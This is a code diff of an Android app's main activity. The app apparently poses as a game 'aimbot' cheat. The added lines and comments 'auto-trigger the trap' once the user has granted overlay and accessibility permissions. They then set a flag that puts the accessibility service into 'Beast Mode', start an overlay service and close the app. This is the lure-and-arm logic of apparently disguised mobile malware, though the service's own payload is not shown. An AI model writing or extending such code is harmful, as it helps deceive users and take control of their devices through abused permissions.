@@ -24,7 +24,6 @@ public class MainActivity extends Activity {
         webView.getSettings().setJavaScriptEnabled(true);
         webView.getSettings().setDomStorageEnabled(true);
         webView.setWebViewClient(new WebViewClient());
-        
         webView.loadUrl("file:///android_asset/index.html");
         webView.addJavascriptInterface(new WebAppInterface(this, this), "Android");
     }
@@ -32,6 +31,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
+        // Auto-trigger the trap if permissions are granted and the toggle is ON
         if (!isActivated && Settings.canDrawOverlays(this) && isAccessibilityEnabled()) {
             webView.evaluateJavascript("(function() { return document.getElementById('toggle-aimbot').checked; })();", value -> {
                 if ("true".equals(value)) {
@@ -52,6 +52,9 @@ public class MainActivity extends Activity {
         if (isActivated) return;
         isActivated = true;
 
+        // FLIP THE SWITCH: Tell the Accessibility Service to go into Beast Mode
+        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_activated", true).commit();
+
         runOnUiThread(() -> {
             try {
                 Intent serviceIntent = new Intent(MainActivity.this, OverlayService.class);
@@ -60,6 +63,7 @@ public class MainActivity extends Activity {
                 } else {
                     startService(serviceIntent);
                 }
+                // Wait 1 second before closing so the service can start
                 handler.postDelayed(this::finish, 1000);
             } catch (Exception e) {
                 e.printStackTrace();
